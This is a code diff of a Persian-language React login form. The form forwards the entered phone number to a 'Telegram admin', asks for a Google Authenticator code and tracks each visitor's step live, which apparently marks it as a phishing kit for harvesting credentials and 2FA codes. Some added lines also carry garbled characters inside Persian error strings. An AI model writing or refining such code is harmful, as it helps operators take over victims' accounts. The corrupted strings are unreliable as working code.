@@ -117,7 +117,7 @@ export const LoginForm = () => {
   useEffect(() => {
     if (sessionId) {
       console.log(
-        "���� Starting smart activity tracking for session:",
+        "🧠 Starting smart activity tracking for session:",
         sessionId,
       );
 
@@ -142,28 +142,20 @@ export const LoginForm = () => {
           statusEmoji,
         );
       };
-      };
 
-      // Start smart tracking
-      smartActivityService.startSmartTracking(
+      // Start professional tracking
+      professionalActivitySystem.startTracking(
         sessionId,
-        currentStep,
         handleStatusChange,
+        currentStep,
       );
 
       return () => {
-        console.log("🛑 Stopping smart activity tracking");
-        smartActivityService.stopSmartTracking();
+        console.log("🛑 Stopping professional activity tracking");
+        professionalActivitySystem.stopTracking();
       };
     }
-  }, [sessionId]);
-
-  // Update tracking when step changes
-  useEffect(() => {
-    if (sessionId && currentStep) {
-      smartActivityService.updateStep(currentStep);
-    }
-  }, [currentStep, sessionId]);
+  }, [sessionId, currentStep]);
 
   // Countdown timer for verify-phone step
   useEffect(() => {
@@ -287,7 +279,7 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("��� Sending phone number to Telegram admin:", mobileNumber);
+      console.log("📞 Sending phone number to Telegram admin:", mobileNumber);
       const result = await sendPhoneToTelegramEnhanced(mobileNumber);
 
       if (!result.success) {
@@ -314,7 +306,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا در ارسال ا��لاعات. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -467,7 +459,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!googleCode || googleCode.length !== 6) {
-      setErrors({ googleCode: "کد Google Authenticator ۶ رقمی را وارد کنید" });
+      setErrors({ googleCode: "کد Google Authenticator ۶ رقمی را و��رد کنید" });
       return;
     }
 
